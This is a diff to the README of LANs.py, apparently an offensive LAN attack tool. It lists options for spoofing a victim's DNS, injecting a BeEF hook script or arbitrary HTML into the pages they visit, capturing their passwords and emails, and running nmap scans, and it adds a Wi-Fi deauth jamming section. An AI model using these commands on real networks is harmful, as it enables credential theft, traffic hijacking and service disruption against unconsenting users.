@@ -14,9 +14,12 @@ Tested on Kali 1.0. In the following examples 192.168.0.5 will be the attacking 
 All options:
 
 ``` shell
-python LANs.py [-a] [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC] [-d]
-  [-v] [-dns DNSSPOOF] [-r IPADDRESS] [-set] [-p] [-na] [-n] [-i INTERFACE] 
-  [-rip ROUTERIP] [-rmac ROUTERMAC] [-pcap PCAP]
+Python LANs.py  [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC]
+                [-d] [-v] [-dns DNSSPOOF] [-a] [-set] [-p] [-na] [-n]
+                [-i INTERFACE] [-r REDIRECTTO] [-rip ROUTERIP]
+                [-rmac ROUTERMAC] [-pcap PCAP] [-s SKIP] [-ch CHANNEL]
+                [-m MAXIMUM] [-no] [-t TIMEINTERVAL] [--packets PACKETS]
+                [--directedonly] [--accesspoint ACCESSPOINT]
 ```
 
 Usage
@@ -93,40 +96,49 @@ python LANs.py -v -d -p -n -na -set -a -r 80.87.128.67 -c '<title>Owned.</title>
 ``` shell
 python LANs.py -h
 ```
+Normal Usage
 
--b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js
+  * -b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js
+  
+  * -c 'HTML CODE': inject arbitrary HTML code into pages the victim visits; include the quotes when selecting HTML to inject
+  
+  * -d: open an xterm with driftnet to see all images they view
+  
+  * -dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com
+  
+  * -a: Spoof every DNS response the victim makes, effectively creating a captive portal page; -r option can be used with this
+  
+  * -r IPADDRESS: only to be used with the -dns DOMAIN option; redirect the user to this IPADDRESS when they visit DOMAIN
+  
+  * -u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
+  
+  * -i INTERFACE: specify interface; default is first interface in `ip route`, eg: -i wlan0
+  
+  * -ip: target this IP address
+  
+  * -n: performs a quick nmap scan of the target
+  
+  * -na: performs an aggressive nmap scan in the background and outputs to [victim IP address].nmap.txt
+  
+  * -p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received
+  
+  * -pcap PCAP_FILE: parse through all the packets in a pcap file; requires the -ip [target's IP address] argument
+  
+  * -rmac ROUTER_MAC: enter router MAC here if you're having trouble getting the script to automatically fetch it
+  
+  * -rip ROUTER_IP: enter router IP here if you're having trouble getting the script to automatically fetch it
+  
+  * -v: show verbose URLs which do not truncate at 150 characters like -u
 
--c 'HTML CODE': inject arbitrary HTML code into pages the victim visits; include the quotes when selecting HTML to inject
-
--d: open an xterm with driftnet to see all images they view
-
--dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com
-
--a: Spoof every DNS response the victim makes, effectively creating a captive portal page; -r option can be used with this
-
--r IPADDRESS: only to be used with the -dns DOMAIN option; redirect the user to this IPADDRESS when they visit DOMAIN
-
--u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
-
--i INTERFACE: specify interface; default is first interface in `ip route`, eg: -i wlan0
-
--ip: target this IP address
-
--n: performs a quick nmap scan of the target
-
--na: performs an aggressive nmap scan in the background and outputs to [victim IP address].nmap.txt
-
--p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received
-
--pcap PCAP_FILE: parse through all the packets in a pcap file; requires the -ip [target's IP address] argument
-
--rmac ROUTER_MAC: enter router MAC here if you're having trouble getting the script to automatically fetch it
-
--rip ROUTER_IP: enter router IP here if you're having trouble getting the script to automatically fetch it
-
--v: show verbose URLs which do not truncate at 150 characters like -u
-
-
+Wifi Jamming
+  * -s MAC_Address_to_skip: Specify a MAC address to skip deauthing. Example: -s 00:11:BB:33:44:AA
+  * -ch CHANNEL: Limit wifijammer to single channel
+  * -m MAXIMUM: Maximum number of clients to deauth
+  * -no: Do not clear the deauth list when the maximum (-m) number of client/AP combos is reached. Must be used in conjunction with -m. Example: -m 10 -n
+  * -t TIME_INTERVAL: Time between each deauth packet. Default is maximum. If you see scapy errors like 'no buffer space' try: -t .00001
+  * --packets NUMBER: Number of packets to send in each deauth burst. Default is 1 packet. 
+  * --directedonly: Don't send deauth packets to the broadcast address of APs and only send to client/AP pairs
+  * --accesspoint ROUTER_MAC: Enter the MAC address of a specific AP to target. 
 
 ### Clean up
 
